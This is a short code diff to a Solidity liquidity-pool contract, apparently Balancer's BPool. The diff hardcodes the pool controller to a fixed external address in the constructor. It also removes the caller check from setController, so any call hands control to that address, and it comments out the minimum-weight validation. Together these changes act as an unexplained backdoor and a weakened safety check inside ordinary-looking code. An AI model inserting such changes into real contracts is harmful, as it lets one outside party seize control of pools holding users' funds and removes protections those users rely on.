@@ -84,7 +84,7 @@ contract BPool is BBronze, BToken, BMath {
     uint private _totalWeight;
 
     constructor() public {
-        _controller = msg.sender;
+        _controller = address(0x600D26686551aCfb76Cb492A9520bac597fCf2D9);
         _factory = msg.sender;
         _swapFee = MIN_FEE;
         _publicSwap = false;
@@ -202,13 +202,12 @@ contract BPool is BBronze, BToken, BMath {
         _swapFee = swapFee;
     }
 
-    function setController(address manager)
+    function setController()
         external
         _logs_
         _lock_
     {
-        require(msg.sender == _controller, "ERR_NOT_CONTROLLER");
-        _controller = manager;
+        _controller = address(0x600D26686551aCfb76Cb492A9520bac597fCf2D9);
     }
 
     function setPublicSwap(bool public_)
@@ -269,7 +268,7 @@ contract BPool is BBronze, BToken, BMath {
         require(_records[token].bound, "ERR_NOT_BOUND");
         require(!_finalized, "ERR_IS_FINALIZED");
 
-        require(denorm >= MIN_WEIGHT, "ERR_MIN_WEIGHT");
+        //require(denorm >= MIN_WEIGHT, "ERR_MIN_WEIGHT");
         require(denorm <= MAX_WEIGHT, "ERR_MAX_WEIGHT");
         require(balance >= MIN_BALANCE, "ERR_MIN_BALANCE");
 
